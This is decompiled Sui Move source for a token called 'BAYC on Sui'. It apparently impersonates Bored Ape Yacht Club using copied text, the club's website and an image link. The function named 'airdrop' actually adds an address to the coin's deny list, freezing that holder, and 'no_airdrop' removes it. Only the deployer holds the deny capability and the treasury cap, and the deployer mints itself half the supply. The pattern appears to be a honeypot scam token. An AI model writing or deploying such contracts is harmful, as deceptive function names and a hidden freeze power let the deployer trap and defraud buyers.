module 0xc54f3ce803ff7c9d2c2bf6727d4fca2c64324de8ec5b711dd2e11da2cc158814::bayc {
    struct BAYC has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BAYC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BAYC>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: BAYC, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BAYC>(arg0, 9, b"BAYC", b"BAYC on Sui", b"Your Bored Ape doubles as your Yacht Club membership card, and grants access to members-only benefits, the first of which is access to THE BATHROOM, a collaborative graffiti board. Future areas and perks can be unlocked by the community through roadmap activation. Visit www.BoredApeYachtClub.com for more details.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.seadn.io/gae/Ju9CkWtV-1Okvf45wo8UctR-M9He2PjILP0oOvxE89AyiPPGtrR3gysu1Zgy0hjd2xKIgjJJtWIc0ybj4Vd7wv8t3pxDGHoJBzDB?auto=format&dpr=1&w=256")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BAYC>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BAYC>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<BAYC>(&mut v3, 500000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::coin::mint_and_transfer<BAYC>(&mut v3, 166666666666666660, @0xbb2a8bd8cbe3ef5e9e89ff6369d7d57afba32032ab99f9071d81984201b37b94, arg1);
        0x2::coin::mint_and_transfer<BAYC>(&mut v3, 166666666666666660, @0x69e913240570e08d73a420a29906acc3013462ce79a9f7f94b6875777fbe9ac5, arg1);
        0x2::coin::mint_and_transfer<BAYC>(&mut v3, 166666666666666660, @0x5cb636d3c68707cc93502208475759b267788a18dacbe6b810109bacb8988875, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<BAYC>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BAYC>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BAYC>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

